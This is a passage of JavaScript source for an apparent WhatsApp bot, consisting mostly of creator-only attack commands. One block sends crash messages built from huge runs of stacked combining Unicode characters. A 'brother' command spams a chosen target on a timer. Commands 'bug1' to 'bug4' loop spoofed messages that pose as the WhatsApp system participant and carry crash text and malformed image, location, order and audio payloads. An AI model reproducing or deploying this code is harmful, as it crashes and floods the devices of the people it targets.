                    await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ CRASHING"}, {quoted: a})
                    m.reply(`© 𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰`)
                     }
                break
case 'brother' : {
if(!m.key.fromMe) return
if (!isCreator) return
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
a = await hisoka.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
hisoka.sendMessage(Pe, {text: "Hy"}, {quoted: a})
await sleep(10000)
hisoka.sendMessage(Pe, {text: "Hy"}, {quoted: a})
await sleep(10000)
hisoka.sendMessage(Pe, {text: "Hy"}, {quoted: a})
await sleep(10000)
hisoka.sendMessage(Pe, {text: "Hy"}, {quoted: a})
await sleep(10000)
hisoka.sendMessage(Pe, {text: "Hy"}, {quoted: a})
await sleep(10000)
hisoka.sendMessage(Pe, {text: "Hy"}, {quoted: a})
await sleep(10000)
hisoka.sendMessage(Pe, {text: "Hy"}, {quoted: a})
await sleep(10000)
hisoka.sendMessage(Pe, {text: "Hy"}, {quoted: a})
await sleep(10000)
}
break
//=================================================//
case 'bug1': {
if(!m.key.fromMe) return
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
var main = {
  "key": {
"fromMe": false,
"participant": "0@s.whatsapp.net",
...({"remoteJid":''})
  },
  "message":{
"imageMessage":{
  "mimetype":"image/jpeg",
  "jpegThumbnail":fs.readFileSync('./pict.jpg')
}
  }
}
reply(m.chat, `© 𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ PICT`, main)
}
}
break
//=================================================//
case 'bug2': {
if(!m.key.fromMe) return
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
var main = {
 "key": {
"fromMe": false,
"participant": "0@s.whatsapp.net",
...({"remoteJid":''})
},
  "message": {
"locationMessage": {}
   }
}
hwmods(m.chat, `© 𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ LOCATION`, main)
}
}
break
//=================================================//
case 'bug3': {
if(!m.key.fromMe) return
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
var main = {
 "key": {
"fromMe": false,
"participant": "0@s.whatsapp.net",
...({"remoteJid":''})
},
  "message": {
 "orderMessage": {
"orderId": "594071395007984",
"thumbnail": fs.readFileSync('./pict.jpg'),
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ ${ngazap(prefix)}`,
"orderTitle": "Hwmods",
"sellerJid": "62857887347569@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR"
  }
   }
}
review(m.chat, `© 𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ TROLI`, main)
}
}
break
//=================================================//
case 'bug4': {
if(!m.key.fromMe) return
if (!isCreator) return
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
var main = {
 "key": {
"fromMe": false,
"participant": "0@s.whatsapp.net",
...({"remoteJid":''})
},
  "message": {
  "audioMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqXaKHS3AY_ONTjToJq-wEqO11SqPgaAzGLzg02IBAVP.enc",
"mimetype": "audio/aac",
"fileSha256": "3kPrHVqimG+Y7dLgq/q+KPFbZczIgg7SBbuU3UdrinQ=",
"fileLength": "285473",
"seconds": 23,
"caption": `𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰`,
"ptt": false,
"mediaKey": "SPVvc1ACQyGfWw8CFuqtQ8RUrv8rsa1JK5AkqcMiPEI=",
"fileEncSha256": "H8EQqzkVWPOvrjoAOGC9FgJkO5KMlScV8+G7ucyVwlo=",
"directPath": "/v/t62.7114-24/35331424_231575432280264_9094348830349350878_n.enc?ccb=11-4&oh=bb04b71d85c088ec24446502b8c52d14&oe=61767ADB",
